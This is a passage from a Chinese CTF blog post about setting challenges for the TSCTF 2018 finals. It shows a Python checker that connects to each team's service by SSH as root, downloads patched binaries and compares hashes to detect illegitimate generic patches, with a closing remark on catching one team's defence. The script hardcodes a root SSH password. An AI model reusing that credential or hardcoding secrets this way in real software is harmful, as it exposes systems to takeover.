:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(check_server, payload)</span>:</span></span><br><span class="line">    <span class="comment">#print payload</span></span><br><span class="line">    r = requests.post(check_server, data=payload)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(filename, str)</span>:</span></span><br><span class="line">    f = open(filename + <span class="string">".log"</span>, <span class="string">'ab'</span>)</span><br><span class="line">    f.write(str)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">(info,ip=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> info</span><br><span class="line">    log(log_file, info + <span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> ip!=<span class="string">""</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./checkresult/'</span>):</span><br><span class="line">            os.makedirs(<span class="string">'./checkresult/'</span>)         </span><br><span class="line">        log(<span class="string">'./checkresult/'</span>+ip+<span class="string">'.log'</span>,<span class="string">'['</span>+time.asctime( time.localtime(time.time()) )+<span class="string">']  '</span>+ info + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CalcMD5</span><span class="params">(filepath)</span>:</span></span><br><span class="line">  <span class="keyword">with</span> open(filepath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    md5obj.update(f.read())</span><br><span class="line">    hash = md5obj.hexdigest()</span><br><span class="line">    <span class="comment">#print(hash)</span></span><br><span class="line">    <span class="keyword">return</span> hash</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_check</span><span class="params">(file_path,standard,oip)</span>:</span></span><br><span class="line">    <span class="comment">#print "in"</span></span><br><span class="line">    f = open(file_path,<span class="string">"rb"</span>)</span><br><span class="line">    f_standard  = open(standard,<span class="string">'rb'</span>)</span><br><span class="line"><span class="comment">#main 0x3370 - 0x325a</span></span><br><span class="line">    f.seek(<span class="number">0x325a</span>,<span class="number">0</span>)</span><br><span class="line">    f_standard.seek(<span class="number">0x325a</span>,<span class="number">0</span>)</span><br><span class="line">    standard_tmp = f_standard.read(<span class="number">0x3370</span><span class="number">-0x325a</span>)</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    tmp = f.read(<span class="number">0x3370</span><span class="number">-0x325a</span>)</span><br><span class="line">    md5obj.update(tmp)</span><br><span class="line">    hash_tmp = md5obj.hexdigest()</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    <span class="comment">#tmp = f.read(0x28f0-0x1273)</span></span><br><span class="line">    md5obj.update(standard_tmp)</span><br><span class="line">    hash_standard = md5obj.hexdigest()    </span><br><span class="line">    <span class="keyword">if</span> (hash_tmp!=hash_standard):</span><br><span class="line">        f.close()</span><br><span class="line">        print_log(colored(<span class="string">'[Error] in patch main : '</span> + oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=oip)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>        </span><br><span class="line"><span class="comment"># init 0x29D6 0x2AB6</span></span><br><span class="line">    f.seek(<span class="number">0x29D6</span>,<span class="number">0</span>)</span><br><span class="line">    f_standard.seek(<span class="number">0x29D6</span>,<span class="number">0</span>)</span><br><span class="line">    standard_tmp = f_standard.read(<span class="number">0x2AB6</span><span class="number">-0x29D6</span>)</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    tmp = f.read(<span class="number">0x2AB6</span><span class="number">-0x29D6</span>)</span><br><span class="line">    md5obj.update(tmp)</span><br><span class="line">    hash_tmp = md5obj.hexdigest()</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    <span class="comment">#tmp = f.read(0x28f0-0x1273)</span></span><br><span class="line">    md5obj.update(standard_tmp)</span><br><span class="line">    hash_standard = md5obj.hexdigest()    </span><br><span class="line">    <span class="keyword">if</span> (hash_tmp!=hash_standard):</span><br><span class="line">        f.close()</span><br><span class="line">        print_log(colored(<span class="string">'[Error] in patch init : '</span> + oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=oip)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>   </span><br><span class="line"><span class="comment"># menu 0x2AB7 0x2b03</span></span><br><span class="line">    f.seek(<span class="number">0x2AB7</span>,<span class="number">0</span>)</span><br><span class="line">    f_standard.seek(<span class="number">0x2AB7</span>,<span class="number">0</span>)</span><br><span class="line">    standard_tmp = f_standard.read(<span class="number">0x2b03</span><span class="number">-0x2AB7</span>)</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    tmp = f.read(<span class="number">0x2b03</span><span class="number">-0x2AB7</span>)</span><br><span class="line">    md5obj.update(tmp)</span><br><span class="line">    hash_tmp = md5obj.hexdigest()</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    <span class="comment">#tmp = f.read(0x28f0-0x1273)</span></span><br><span class="line">    md5obj.update(standard_tmp)</span><br><span class="line">    hash_standard = md5obj.hexdigest()    </span><br><span class="line">    <span class="keyword">if</span> (hash_tmp!=hash_standard):</span><br><span class="line">        f.close()</span><br><span class="line">        print_log(colored(<span class="string">'[Error] in patch menu : '</span> + oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=oip)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    f.seek(<span class="number">0x4412</span>,<span class="number">0</span>)</span><br><span class="line">    flag_str =f.read(<span class="number">22</span>)</span><br><span class="line">    <span class="comment">#print flag_str</span></span><br><span class="line">    <span class="keyword">if</span> flag_str !=<span class="string">'/home/tsctf/flag/flag\0'</span>:</span><br><span class="line">        f.close()</span><br><span class="line">        print_log(colored(<span class="string">'[Error] in game-&gt;patch flag path : '</span> + oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=oip)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    f.seek(<span class="number">0x1273</span>,<span class="number">0</span>)</span><br><span class="line">    f_standard.seek(<span class="number">0x1273</span>,<span class="number">0</span>)</span><br><span class="line">    standard_tmp = f_standard.read(<span class="number">0x28f0</span><span class="number">-0x1273</span>)</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    tmp = f.read(<span class="number">0x28f0</span><span class="number">-0x1273</span>)</span><br><span class="line">    md5obj.update(tmp)</span><br><span class="line">    hash_tmp = md5obj.hexdigest()</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    <span class="comment">#tmp = f.read(0x28f0-0x1273)</span></span><br><span class="line">    md5obj.update(standard_tmp)</span><br><span class="line">    hash_standard = md5obj.hexdigest()    </span><br><span class="line">    <span class="keyword">if</span> (hash_tmp!=hash_standard):</span><br><span class="line">        f.close()</span><br><span class="line">        print_log(colored(<span class="string">'[Error] in game-&gt;patch game code : '</span> + oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=oip)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>        </span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_thread</span><span class="params">(round)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    function: cheinvalid literal for int() with base 10:ck every targeted ip</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    port = <span class="number">40111</span><span class="comment">#1022</span></span><br><span class="line">    ipbase = <span class="string">'172.16.20.'</span></span><br><span class="line">    team_num = <span class="number">17</span></span><br><span class="line"></span><br><span class="line">    check_result = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if not debug:</span></span><br><span class="line">    <span class="comment">#    time.sleep(random.randint(10, 20))</span></span><br><span class="line"></span><br><span class="line">    print_log(</span><br><span class="line">        colored(<span class="string">'================= Round %d =================='</span> % round, <span class="string">"green"</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, team_num+<span class="number">1</span>):</span><br><span class="line">        ip = ipbase + str(i)</span><br><span class="line">        print_log(<span class="string">'check ip: '</span> + ip)</span><br><span class="line">        check_count = <span class="number">0</span></span><br><span class="line">        file_check  = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">            <span class="string">"""</span></span><br><span class="line"><span class="string">            check 5 times for every ip, </span></span><br><span class="line"><span class="string">            if check fail more than three times, then check result is down</span></span><br><span class="line"><span class="string">            """</span></span><br><span class="line">            <span class="comment">#ip = "127.0.0.1"</span></span><br><span class="line">            <span class="comment">#port = 2111</span></span><br><span class="line">            single_check = check(ip, port)</span><br><span class="line">            <span class="keyword">if</span> single_check == <span class="number">0</span>:</span><br><span class="line">                print_log(<span class="string">"[check %d] address: %s result: successful"</span> %</span><br><span class="line">                          (i + <span class="number">1</span>, ip))</span><br><span class="line">            <span class="keyword">elif</span> single_check == <span class="number">1</span>:</span><br><span class="line">                check_count += <span class="number">1</span></span><br><span class="line">                print_log(<span class="string">"[check %d] address: %s result: failed"</span> %</span><br><span class="line">                          (i + <span class="number">1</span>, ip))</span><br><span class="line">        <span class="comment"># check shell</span></span><br><span class="line">        <span class="comment"># to determine whether a team uses common guard</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ssh_shell = ssh(host=ip, port = <span class="number">1022</span>,user=<span class="string">'root'</span>, password=<span class="string">'GA7E12EH2C3CFEBBD1G4'</span>,cache=<span class="keyword">False</span>)</span><br><span class="line">            ssh_shell.download(file_path,<span class="string">'./file/'</span>+ip+<span class="string">'.bin'</span>)</span><br><span class="line">            ssh_shell.close()</span><br><span class="line">            <span class="comment">#print os.path.getsize('pwn1')</span></span><br><span class="line">            <span class="comment">#print CalcMD5("DNS_Server_standard")</span></span><br><span class="line">            <span class="comment">#print CalcMD5('./file/'+ip+'.bin')</span></span><br><span class="line">            <span class="keyword">if</span> (CalcMD5(<span class="string">"DNS_Server_standard"</span>)!= CalcMD5(<span class="string">'./file/'</span>+ip+<span class="string">'.bin'</span>)):</span><br><span class="line">                <span class="keyword">if</span> abs(os.path.getsize(<span class="string">'DNS_Server_standard'</span>) - os.path.getsize(<span class="string">'./file/'</span>+ip+<span class="string">'.bin'</span>)) &gt; <span class="number">128</span>:</span><br><span class="line">                    print_log(colored(<span class="string">'[Warning] find doubtful patch : '</span> + ip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=ip)</span><br><span class="line">                <span class="keyword">if</span>(coding_check_level):</span><br><span class="line">                    file_check = patch_check(<span class="string">'./file/'</span>+ip+<span class="string">'.bin'</span>,<span class="string">"DNS_Server_standard"</span>,ip)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print_log(</span><br><span class="line">                        colored(<span class="string">'[info] file size check ok: '</span> + ip + <span class="string">'\n'</span>, <span class="string">'green'</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print_log(str(e))</span><br><span class="line">            print_log(</span><br><span class="line">                colored(<span class="string">'[Error] cannnot connect %s by ssh'</span> % ip, <span class="string">"yellow"</span>))</span><br><span class="line">    <span class="comment"># upload check result into server</span></span><br><span class="line">        <span class="keyword">if</span>(file_check==<span class="number">1</span>):</span><br><span class="line">            print_log(<span class="string">"[patch_check] address: %s result: successful"</span> %(ip))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_log(<span class="string">"[patch_check] address: %s result: failed"</span> %(ip))    </span><br><span class="line">        print_log(<span class="string">""</span>)   </span><br><span class="line">        <span class="keyword">print</span> check_count,file_check</span><br><span class="line">        <span class="keyword">if</span> ((check_count &gt;= <span class="number">2</span>) | (file_check == <span class="number">0</span>)):</span><br><span class="line">            check_result.append(&#123;<span class="string">'tid'</span>:ip.split(<span class="string">'.'</span>)[<span class="number">-1</span>],<span class="string">'qid'</span>: <span class="string">'3'</span>, <span class="string">'state'</span>: <span class="number">2</span>&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            check_result.append(&#123;<span class="string">'tid'</span>:ip.split(<span class="string">'.'</span>)[<span class="number">-1</span>],<span class="string">'qid'</span>: <span class="string">'3'</span>, <span class="string">'state'</span>: <span class="number">0</span>&#125;)   </span><br><span class="line">        <span class="comment">#print check_result</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#print json.dumps(check_result)</span></span><br><span class="line">        upload(<span class="string">"http://172.16.123.123/commapi/script/setServiceState"</span>,</span><br><span class="line">               &#123;<span class="string">'result'</span>: json.dumps(check_result)&#125;)</span><br><span class="line">        <span class="comment">#print json.dumps(check_result)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print_log(<span class="string">'[HttpError] cannot connect to http server'</span>)</span><br><span class="line">    print_log(str(check_result))</span><br><span class="line">    print_log(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_test</span><span class="params">()</span>:</span></span><br><span class="line">    port = <span class="number">2111</span></span><br><span class="line">    ipbase = <span class="string">'172.16.10.'</span></span><br><span class="line">    <span class="comment">#ip = '10.210.103.168'</span></span><br><span class="line">    check_result = []</span><br><span class="line">    check_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        single_check = check(ip, port)</span><br><span class="line">        <span class="keyword">if</span> single_check == <span class="number">0</span>:</span><br><span class="line">            print_log(<span class="string">"[check %d] address: %s result: successful"</span> %</span><br><span class="line">                      (i + <span class="number">1</span>, ip))</span><br><span class="line">        <span class="keyword">elif</span> single_check == <span class="number">1</span>:</span><br><span class="line">            check_count += <span class="number">1</span></span><br><span class="line">            print_log(<span class="string">"[check %d] address: %s result: failed"</span> %</span><br><span class="line">                      (i + <span class="number">1</span>, ip))</span><br><span class="line">    print_log(<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> check_count &gt;= <span class="number">3</span>:</span><br><span class="line">        check_result.append(&#123;<span class="string">'ip'</span>: <span class="string">'172.16.20.3'</span>, <span class="string">'state'</span>: <span class="number">1</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        check_result.append(&#123;<span class="string">'ip'</span>: <span class="string">'172.16.20.3'</span>, <span class="string">'state'</span>: <span class="number">0</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check shell</span></span><br><span class="line">        <span class="comment"># to determine whether a team uses common guard</span></span><br><span class="line">    <span class="comment"># upload check result into server</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        upload(<span class="string">"http://172.16.123.123/check_the_player.php"</span>,</span><br><span class="line">               &#123;<span class="string">'result'</span>: json.dumps(check_result)&#125;)</span><br><span class="line">        <span class="keyword">print</span> json.dumps(check_result)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print_log(<span class="string">'[HttpError] cannot connect to http server'</span>)</span><br><span class="line">    print_log(str(check_result))</span><br><span class="line">    print_log(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    round = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./checkresult/'</span>):</span><br><span class="line">        os.makedirs(<span class="string">'./checkresult/'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./file/'</span>):</span><br><span class="line">        os.makedirs(<span class="string">'./file/'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        thread.start_new_thread(check_thread, (round, ))</span><br><span class="line">        time.sleep(round_time)  <span class="comment"># five minutes</span></span><br><span class="line">        round += <span class="number">1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">1. patch heap</span></span><br><span class="line"><span class="string">2. login? 1.2.</span></span><br><span class="line"><span class="string">3. serach</span></span><br><span class="line"><span class="string">4. delete single</span></span><br><span class="line"><span class="string">5. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>线下赛的时候在Checker机制中也发现了许多问题，对于通防的思路还是太窄，好在刚开始比赛的时候用size大小的方法+手工的方法查到了NeSE战队的通防，威逼利诱的情况下后来比赛中没有出现其他通防。</p>
<p>偷偷立个flag：想在这个假期写一套自己的通防框架。</p>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2018/06/25/pwnhub_Panda's_gift/">胖哈勃Panda&#39;s gift 及 TSCTF 2018 FINAL出题笔记</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页">P4nda</a></p>
        <p><span>发布时间:</span>2018-06-25, 20:30:22</p>
        <p><span>最后更新:</span>2018-07-05, 21:40:09</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2018/06/25/pwnhub_Panda's_gift/" title="胖哈勃Panda&#39;s gift 及 TSCTF 2018 FINAL出题笔记">http://p4nda.top/2018/06/25/pwnhub_Panda&#39;s_gift/</a>
            <span class="copy-path" data-clipboard-text="原文: http://p4nda.top/2018/06/25/pwnhub_Panda&#39;s_gift/　　作者: P4nda" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2018/06/28/pwnable-tw-wannaheap/">
                    【PWNABLE.TW】 wannaheap 解题思路
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2018/05/29/suctf2018/">
                    SUCTF 2018部分PWN题复现
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#胖哈勃Panda’s-gift出题"><span class="toc-number">1.</span> <span class="toc-text">胖哈勃Panda’s gift出题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">1.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞设置"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#地址预测"><span class="toc-number">1.3.1.</span> <span class="toc-text">地址预测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#printf格式化字符串利用"><span class="toc-number">1.3.2.</span> <span class="toc-text">printf格式化字符串利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#scanf格式化字符串控制"><span class="toc-number">1.3.3.</span> <span class="toc-text">scanf格式化字符串控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#地址泄露"><span class="toc-number">1.3.4.</span> <span class="toc-text">地址泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#劫持控制流"><span class="toc-number">1.3.5.</span> <span class="toc-text">劫持控制流</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TSCTF-2018-FINAL-PWN1-Writeup"><span class="toc-number">2.</span> <span class="toc-text">TSCTF 2018 FINAL PWN1 Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#伪随机数预测"><span class="toc-number">2.1.</span> <span class="toc-text">伪随机数预测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Double-Free"><span class="toc-number">2.2.</span> <span class="toc-text">Double Free</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#格式化字符串大礼包"><span class="toc-number">2.3.</span> <span class="toc-text">格式化字符串大礼包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目源码"><span class="toc-number">2.4.</span> <span class="toc-text">题目源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Checker"><span class="toc-number">2.5.</span> <span class="toc-text">Checker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Other"><span class="toc-number">2.6.</span> <span class="toc-text">Other</span></a></li></ol></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>



    
<div class="share">
    
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"胖哈勃Panda's gift 及 TSCTF 2018 FINAL出题笔记　| p4nda's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    

    
</div>







    
        <section id="comments">
    <style> aside.comment-bar { margin: auto 30px; }</style>
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function(){
            this.page.url = 'http://p4nda.top/2018/06/25/pwnhub_Panda&#39;s_gift/';
            this.page.identifier = '2018/06/25/pwnhub_Panda&#39;s_gift/';
        };
        var loadComment = function(){
            var d = document, s = d.createElement('script');
            s.src = '//p4nda.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        }
    </script>
    
    <script> loadComment(); </script>

</section>


    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2018/06/28/pwnable-tw-wannaheap/" title="上一篇: 【PWNABLE.TW】 wannaheap 解题思路">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2018/05/29/suctf2018/" title="下一篇: SUCTF 2018部分PWN题复现">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/07/02/patch-in-pwn/">CTF线下赛中常用的PWN题patch方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/28/pwnable-tw-wannaheap/">【PWNABLE.TW】 wannaheap 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/25/pwnhub_Panda's_gift/">胖哈勃Panda's gift 及 TSCTF 2018 FINAL出题笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/29/suctf2018/">SUCTF 2018部分PWN题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/ciscn-ctf-2018/">全国大学生信息安全竞赛（CISCN）解题赛部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/18/house-of-rabbit/">House Of Rabbit 原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/17/hitb2018/">HITB CTF 2018 部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/kernel-pwn-start/">CTF KETNEL PWN 入门记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/0ctf2018/">0ctf 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/27/QWB2018/">QWBCTF 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/tcache/">tcache 源码分析及利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/15/n1ctf2018/">N1CTF 2018 && 线程堆知识源代码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/hgame/">HGAME 2018 PWN题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/question/">问题解决及工具使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/05/hitctf/">HITCTF 2018 PWN 题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/15/pwnable-tw-bookwriter/">【PWNABLE.TW】 BookWriter 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/06/pwnable-tw-alivenote/">【PWNABLE.TW】 alive_note 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/13/pwnable-tw-starbound/">【PWNABLE.TW】 starbound 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/pwnable-tw-deathnote/">【PWNABLE.TW】 deathnote 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/20/pwnable-tw-seethefile/">【PWNABLE.TW】 seethefile 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/14/pwnable-tw-applestore/">【PWNABLE.TW】 applestore 解题思路</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2017-2018 P4nda
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
    <script src="/js/GithubRepoWidget.js"></script>

<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
             github: ".github-widget a", 
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

    <script>
        var originTitle = document.title;
        var titleTime;
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                document.title = "(つェ⊂) 天黑了~ " + originTitle;
                clearTimeout(titleTime);
            }
            else {
                document.title = "(*´∇｀*) 天亮了~ " + originTitle;
                titleTime = setTimeout(function() {
                    document.title = originTitle;
                }, 2000);
            }
        })
    </script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/koharu.model.json"},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"pluginJsPath":"lib/","pluginRootPath":"live2dw/"});</script></body>
</html>